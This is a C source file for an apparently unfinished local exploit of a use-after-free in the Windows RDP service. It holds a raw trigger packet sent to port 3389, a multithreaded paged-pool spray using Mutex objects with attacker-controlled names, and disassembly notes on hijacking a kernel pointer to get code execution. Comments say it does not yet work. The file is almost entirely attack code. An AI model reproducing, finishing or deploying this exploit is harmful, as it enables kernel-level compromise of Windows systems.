#pragma warning (disable : 4996)

#define EXPLOIT_TARGET_PORT 3389
#define EXPLOIT_SPRAY_CPU_CORE_COUNT 3
#define EXPLOIT_PACKET_COUNT 1

#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>

#include <WinSock2.h>

// The raw packet data provided by Luigi Auriemma.
// If you disassemble this, you won't find much information about what this is (though you can if you're curious for any reason).
// Instead, you should analyze this in a tool like Wireshark.
// And if you don't believe that this is safe (which I can't say I blame you for thinking that), then use a hex editor and copy the original packet dump's bytes into this array.
unsigned char g_pPacketData[] =
{
	0x03, 0x00, 0x00, 0x13, 0x0E, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
	0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0xD6, 0x02,
	0xF0, 0x80, 0x7F, 0x65, 0x82, 0x01, 0x94, 0x04, 0x01, 0x01, 0x04, 0x01,
	0x01, 0x01, 0x01, 0xFF, 0x30, 0x19, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x02, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04,
	0x00, 0x00, 0x00, 0x02, 0x30, 0x19, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x01, 0x02, 0x02, 0x04, 0x20, 0x02, 0x04,
	0x00, 0x00, 0x00, 0x02, 0x30, 0x1C, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x02,
	0xFC, 0x17, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x04, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x00, 0x00, 0x00, 0x01,
	0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04, 0x00, 0x00, 0x00, 0x02, 0x04, 0x82,
	0x01, 0x33, 0x00, 0x05, 0x00, 0x14, 0x7C, 0x00, 0x01, 0x81, 0x2A, 0x00,
	0x08, 0x00, 0x10, 0x00, 0x01, 0xC0, 0x00, 0x44, 0x75, 0x63, 0x61, 0x81,
	0x1C, 0x01, 0xC0, 0xD8, 0x00, 0x04, 0x00, 0x08, 0x00, 0x80, 0x02, 0xE0,
	0x01, 0x01, 0xCA, 0x03, 0xAA, 0x09, 0x04, 0x00, 0x00, 0xCE, 0x0E, 0x00,
	0x00, 0x48, 0x00, 0x4F, 0x00, 0x53, 0x00, 0x54, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x01, 0xCA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x07,
	0x00, 0x01, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x2D, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x2D, 0x00, 0x30,
	0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x2D, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x04, 0xC0, 0x0C, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x02, 0xC0, 0x0C, 0x00, 0x1B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x03, 0xC0, 0x2C, 0x00, 0x03, 0x00, 0x00, 0x00, 0x72, 0x64, 0x70,
	0x64, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x63, 0x6C, 0x69,
	0x70, 0x72, 0x64, 0x72, 0x00, 0x00, 0x00, 0xA0, 0xC0, 0x72, 0x64, 0x70,
	0x73, 0x6E, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x03, 0x00, 0x00,
	0x0C, 0x02, 0xF0, 0x80, 0x04, 0x01, 0x00, 0x01, 0x00, 0x03, 0x00, 0x00,
	0x08, 0x02, 0xF0, 0x80, 0x28, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEF, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEB, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEC, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xED, 0x03, 0x00, 0x00, 0x0C, 0x02, 0xF0, 0x80,
	0x38, 0x00, 0x06, 0x03, 0xEE
};

// The template mutex name to use.
// This string will be allocated in the paged pool, taking a grand total of 0xA0 bytes.
// 0xA0 bytes is required as the allocation that we want to reclaim is... well, 0xA0 bytes in size.
unsigned char g_pMutexName[] =
{
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x00, 0x00
};

unsigned char g_StopSpray = 0;

unsigned char TriggerUAF(void)
{
	SOCKET Socket = INVALID_SOCKET;

	struct hostent* pHost = 0;
	unsigned char* pIP = 0;
	struct sockaddr_in SocketAddress = { 0 };

	pHost = gethostbyname("");
	if (!pHost)
	{
		return 1;
	}

	pIP = inet_ntoa(**(struct in_addr**)pHost->h_addr_list);
	if (!pIP)
	{
		return 1;
	}

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (!Socket)
	{
		return 1;
	}

	SocketAddress.sin_family = AF_INET;
	SocketAddress.sin_addr.s_addr = inet_addr(pIP);
	SocketAddress.sin_port = htons(EXPLOIT_TARGET_PORT);
	if (connect(Socket, (const struct sockaddr*)&SocketAddress, sizeof(SocketAddress)))
	{
		return 1;
	}
	Sleep(1000);

	if (send(Socket, g_pPacketData, sizeof(g_pPacketData), 0) == SOCKET_ERROR)
	{
		return 1;
	}

	return 0;
}

// TODO: Find a paged pool object that can be spammed and have the first QWORD/8 bytes user-controlled with a size of 0xA0.
// This exploit will not work otherwise.
// You will find that the exploit currently uses Mutex objects below.
// However, the name of the object (which will contain the paged pool data) cannot have two consecutive null bytes; it will fail.
// Therefore, these are my remaining options:
// 1) Find somewhere in kernel memory (potentially the HAL heap?) where gadgets and other potentially useful data can be found and used on-the-fly (VERY unlikely)
// 2) Find another object and instantly finish the exploit (but our options are rather limited as the size must be 0xA0 and it must be within the paged pool)
//
//
// Original note:
// You may have noticed that the exploit code leaks Mutex object handles.
// And yes, yes it does; this is for the sake of increasing speed.
// If the exploit were to keep track of all of the handles, it would spend precious CPU cycles storing them as opposed to allocating more objects.
// Besides, Windows will free all of the allocations automatically when the exploit terminates.
DWORD WINAPI SprayPagedPool(void* pUnused)
{
	UNREFERENCED_PARAMETER(pUnused);

	while (!g_StopSpray)
	{
		for (unsigned long long j = 8; j < sizeof(g_pMutexName) - 2; j++)
		{
			g_pMutexName[j] = rand() % 0xFF;
		}

		CreateMutexW(0, 0, (LPCWSTR)g_pMutexName);
	}

	return 0;
}

int main(int argc, char** argv)
{
	UNREFERENCED_PARAMETER(argc);
	UNREFERENCED_PARAMETER(argv);

	WSADATA WinsockData = { 0 };

	unsigned char* pKernelData = 0;

	HANDLE hThreads[EXPLOIT_SPRAY_CPU_CORE_COUNT] = { 0 };

	srand(GetTickCount());

	if (WSAStartup(MAKEWORD(2, 2), &WinsockData))
	{
		return 1;
	}

	pKernelData = VirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pKernelData)
	{
		return 1;
	}

	// .text:FFFFF88005C278C1 038 mov     rdx, [rcx]	; Dereference the user-controlled address and store it in rdx
	// .text:FFFFF88005C278C1							; This part is important as rdx will yield code execution later on
	// .text:FFFFF88005C278C1							; rcx however is only needed to bypass certain checks
	//
	// In addition, offset the address by 0x400 (just incase) and an additional 0x28 bytes in preparation for termdd!IcaBufferAllocEx.
	*(void**)(pKernelData) = (void*)((unsigned char*)(pKernelData + 0x400));

	if (!SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS))
	{
		return 1;
	}

	// .text:FFFFF88005C278B9 038 mov     rcx, [rcx]      ; dereference rcx (the pool allocation) and get the first 8 bytes (user-controlled!)
	*(void**)(g_pMutexName) = pKernelData;

	for (unsigned long long i = 0; i < EXPLOIT_SPRAY_CPU_CORE_COUNT; i++)
	{
		hThreads[i] = CreateThread(0, 0, SprayPagedPool, 0, 0, 0);
		if (!hThreads[i])
		{
			return 1;
		}

		if (!SetThreadPriority(hThreads[i], THREAD_PRIORITY_TIME_CRITICAL))
		{
			return 1;
		}
	}

	printf("[!] Time to race on %lu %s...\n", EXPLOIT_SPRAY_CPU_CORE_COUNT, EXPLOIT_SPRAY_CPU_CORE_COUNT == 1 ? "core" : "cores");
	Sleep(2000);

	for (unsigned long long i = 0; i < EXPLOIT_PACKET_COUNT; i++)
	{
		TriggerUAF();
	}

	printf("[*] Sleeping for 2000ms to ensure the packets went through...\n");
	Sleep(2000);

	g_StopSpray = 1;

	WSACleanup();

	// TEMP
	printf("failed...");
	getchar();
	// TEMP
	return 0;
}